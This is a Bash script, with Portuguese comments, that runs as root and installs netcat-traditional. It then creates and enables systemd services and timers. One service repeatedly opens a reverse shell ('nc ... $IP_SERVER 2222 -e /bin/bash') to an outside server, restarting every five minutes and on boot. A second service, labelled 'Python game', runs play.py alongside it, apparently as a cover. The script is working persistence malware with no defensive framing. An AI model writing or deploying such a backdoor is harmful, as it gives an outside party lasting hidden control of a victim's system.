#!/bin/bash

source .env

# Verificar se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

sudo apt remove netcat-openbsd -y

# Verificar se o Netcat está instalado
if ! command -v nc &> /dev/null; then
    echo "Netcat não está instalado. Por favor, instale o Netcat e execute este script novamente."
    sudo apt install netcat-traditional -y
    exit 1
fi


# Criar arquivo de NETCAT
echo "[Unit]
Description=Netcat Server
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=1m
ExecStart=bash -c 'if ! pgrep -x "nc" >/dev/null; then sudo nc -w 1 $IP_SERVER 2222 -e /bin/bash &; fi'
User=$USER


[Install]
WantedBy=multi-user.target" > "$SYSTEMD/$NC_SERVICE"

# Criar arquivo de TIMER do NETCAT
echo "[Unit]
Description=Netcat Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SYSTEMD/$NC_TIMER"

# Criar arquivo de PY
# ExecStart=bash -c 'if ! pgrep -x "play.py" >/dev/null; then $PYTHON_EXECUTABLE $CAMINHO/$ACTUALL/play.py; fi'
# ExecStart=bash -c 'pgrep -x "play.py" || { $PYTHON_EXECUTABLE $START & };'
# echo "[Unit]
# Description=Netcat Server
# After=network.target

# [Service]
# Type=simple
# Restart=always
# RestartSec=1m
# ExecStart=bash -c 'if ! pgrep -x "sudo nc" >/dev/null || ! pgrep -f "sudo nc" >/dev/null; then sudo nc -w 1 $IP_SERVER 2222 -e /bin/bash; fi'
# User=$USER


# [Install]
# WantedBy=multi-user.target" > "$SYSTEMD/$NC_SERVICE"

sudo chmod +x $CAMINHO/tools/start_play.sh

# Criar arquivo de PYTHON
echo "[Unit]
Description=Python game
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=bash -c 'if ! pgrep -x "play.py" >/dev/null; then $CAMINHO/tools/start_play.sh; fi'
User=$USER

[Install]
WantedBy=multi-user.target" > "$SYSTEMD/$PY_SERVICE"

# Criar arquivo de TIMER do PYTHON
echo "[Unit]
Description=Python Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SYSTEMD/$PY_TIMER"

# Recarregar serviços do systemd
sudo systemctl daemon-reload

# Iniciar e habilitar o serviço nc
sudo systemctl unmask $NC_SERVICE
sudo systemctl start $NC_SERVICE
sudo systemctl enable $NC_SERVICE
sudo systemctl unmask $NC_TIMER
sudo systemctl start $NC_TIMER
sudo systemctl enable $NC_TIMER
sudo systemctl unmask $PY_SERVICE
sudo systemctl start $PY_SERVICE
sudo systemctl enable $PY_SERVICE
sudo systemctl unmask $PY_TIMER
sudo systemctl start $PY_TIMER
sudo systemctl enable $PY_TIMER

echo "Configuração do serviço Netcat concluída."